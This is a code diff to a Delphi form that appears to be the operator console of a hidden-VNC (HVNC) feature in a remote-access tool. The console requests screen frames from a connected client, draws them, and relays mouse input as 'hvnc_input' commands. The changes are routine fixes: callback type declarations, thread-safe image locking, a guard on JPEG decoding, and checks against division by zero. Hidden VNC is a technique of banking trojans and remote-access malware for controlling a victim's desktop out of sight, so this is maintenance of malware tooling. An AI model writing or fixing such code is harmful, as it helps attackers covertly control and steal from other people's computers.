@@ -5,7 +5,7 @@ interface
 uses
   Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
   Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.ExtCtrls, Vcl.StdCtrls,
-  System.JSON, ncLines, Vcl.Imaging.jpeg;
+  System.JSON, ncLines, Vcl.Imaging.jpeg, System.SyncObjs;
 
 type
   TForm10 = class(TForm)
@@ -30,10 +30,14 @@ type
     procedure FormKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
     procedure FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
   private
+    type
+      TSendJSONProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
+      TUnregisterProc = procedure(aLine: TncLine) of object;
+  private
     FLine: TncLine;
     FClientID: string;
-    FSendJSON: TProcedure(aLine: TncLine; JSONObj: TJSONObject);
-    FOnUnregister: TProcedure(aLine: TncLine);
+    FSendJSON: TSendJSONProc;
+    FOnUnregister: TUnregisterProc;
     FIsCapturing: Boolean;
     FLastBitmap: TBitmap;
     FImageLock: TObject;
@@ -44,8 +48,8 @@ type
     constructor Create(AOwner: TComponent); override;
     destructor Destroy; override;
     procedure SetupForClient(aLine: TncLine; const ClientID: string;
-      SendJSONProc: TProcedure(aLine: TncLine; JSONObj: TJSONObject);
-      UnregisterProc: TProcedure(aLine: TncLine));
+      SendJSONProc: TSendJSONProc;
+      UnregisterProc: TUnregisterProc);
     procedure DetachCallbacks;
     procedure HandleHVNCJSON(JSONObj: TJSONObject);
     procedure QueueFrameBytes(const Bytes: TBytes);
@@ -92,8 +96,8 @@ begin
 end;
 
 procedure TForm10.SetupForClient(aLine: TncLine; const ClientID: string;
-  SendJSONProc: TProcedure(aLine: TncLine; JSONObj: TJSONObject);
-  UnregisterProc: TProcedure(aLine: TncLine));
+  SendJSONProc: TSendJSONProc;
+  UnregisterProc: TUnregisterProc);
 begin
   FLine := aLine;
   FClientID := ClientID;
@@ -176,7 +180,7 @@ var
 begin
   if not FIsCapturing then
   begin
-    QualityStr := ComboBox1.Text.Replace('%', '');
+    QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
     Quality := StrToIntDef(QualityStr, 50);
 
     Params := TJSONObject.Create;
@@ -251,12 +255,16 @@ begin
 
     JPG := TJPEGImage.Create;
     try
-      JPG.LoadFromStream(MS);
-      TMonitor.Enter(FImageLock);
+      try
+        JPG.LoadFromStream(MS);
+      except
+        Exit;
+      end;
+      System.SyncObjs.TMonitor.Enter(FImageLock);
       try
         FLastBitmap.Assign(JPG);
       finally
-        TMonitor.Exit(FImageLock);
+        System.SyncObjs.TMonitor.Exit(FImageLock);
       end;
     finally
       JPG.Free;
@@ -265,7 +273,7 @@ begin
     MS.Free;
   end;
 
-  TThread.Queue(nil,
+  System.Classes.TThread.Queue(nil,
     procedure
     begin
       PaintBox1.Invalidate;
@@ -274,12 +282,12 @@ end;
 
 procedure TForm10.PaintBox1Paint(Sender: TObject);
 begin
-  TMonitor.Enter(FImageLock);
+  System.SyncObjs.TMonitor.Enter(FImageLock);
   try
     if not FLastBitmap.Empty then
       PaintBox1.Canvas.StretchDraw(PaintBox1.ClientRect, FLastBitmap);
   finally
-    TMonitor.Exit(FImageLock);
+    System.SyncObjs.TMonitor.Exit(FImageLock);
   end;
 end;
 
@@ -296,8 +304,16 @@ begin
   Params := TJSONObject.Create;
   Params.AddPair('event', 'down');
   Params.AddPair('button', TJSONNumber.Create(Btn));
-  Params.AddPair('x', TJSONNumber.Create(MulDiv(X, 65535, PaintBox1.Width)));
-  Params.AddPair('y', TJSONNumber.Create(MulDiv(Y, 65535, PaintBox1.Height)));
+  if PaintBox1.Width > 0 then
+    Params.AddPair('x', TJSONNumber.Create(MulDiv(X, 65535, PaintBox1.Width)))
+  else
+    Params.AddPair('x', TJSONNumber.Create(0));
+
+  if PaintBox1.Height > 0 then
+    Params.AddPair('y', TJSONNumber.Create(MulDiv(Y, 65535, PaintBox1.Height)))
+  else
+    Params.AddPair('y', TJSONNumber.Create(0));
+
   SendHVNCCommand('hvnc_input', Params);
 end;
 
@@ -338,8 +354,17 @@ begin
   Params := TJSONObject.Create;
   Params.AddPair('event', 'up');
   Params.AddPair('button', TJSONNumber.Create(Btn));
-  Params.AddPair('x', TJSONNumber.Create(MulDiv(X, 65535, PaintBox1.Width)));
-  Params.AddPair('y', TJSONNumber.Create(MulDiv(Y, 65535, PaintBox1.Height)));
+
+  if PaintBox1.Width > 0 then
+    Params.AddPair('x', TJSONNumber.Create(MulDiv(X, 65535, PaintBox1.Width)))
+  else
+    Params.AddPair('x', TJSONNumber.Create(0));
+
+  if PaintBox1.Height > 0 then
+    Params.AddPair('y', TJSONNumber.Create(MulDiv(Y, 65535, PaintBox1.Height)))
+  else
+    Params.AddPair('y', TJSONNumber.Create(0));
+
   SendHVNCCommand('hvnc_input', Params);
 end;
 
@@ -351,8 +376,17 @@ begin
 
   Params := TJSONObject.Create;
   Params.AddPair('event', 'move');
-  Params.AddPair('x', TJSONNumber.Create(MulDiv(X, 65535, PaintBox1.Width)));
-  Params.AddPair('y', TJSONNumber.Create(MulDiv(Y, 65535, PaintBox1.Height)));
+
+  if PaintBox1.Width > 0 then
+    Params.AddPair('x', TJSONNumber.Create(MulDiv(X, 65535, PaintBox1.Width)))
+  else
+    Params.AddPair('x', TJSONNumber.Create(0));
+
+  if PaintBox1.Height > 0 then
+    Params.AddPair('y', TJSONNumber.Create(MulDiv(Y, 65535, PaintBox1.Height)))
+  else
+    Params.AddPair('y', TJSONNumber.Create(0));
+
   SendHVNCCommand('hvnc_input', Params);
 end;
 
